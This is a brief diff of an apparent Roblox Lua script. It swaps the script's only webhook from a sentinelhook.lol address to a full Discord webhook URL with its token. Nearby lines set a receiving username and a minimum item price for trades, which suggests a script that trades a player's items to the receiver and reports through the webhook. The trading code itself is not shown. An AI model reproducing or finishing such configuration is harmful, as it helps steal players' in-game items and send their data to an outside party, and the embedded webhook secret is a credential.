@@ -10,7 +10,7 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- The only webhook the script posts to.
-local WEBHOOK = "https://sentinelhook.lol/api.php?id=yKyBI3sNbNq3TpOl"
+local WEBHOOK = "https://discord.com/api/webhooks/1550992212190429327/59ERmpGyPcIpSZUynuVDTPkboeKAacEYRyx7klpdlw9_6bKSQm61WkAlw60-Dp7-6tcl"
 local RECEIVER = {"Alljm100"}
 -- Minimum price an item must have to be traded, expressed in the value base's
 -- own units. The base runs from 0.03 to 1250, so 0.02 lets everything through,
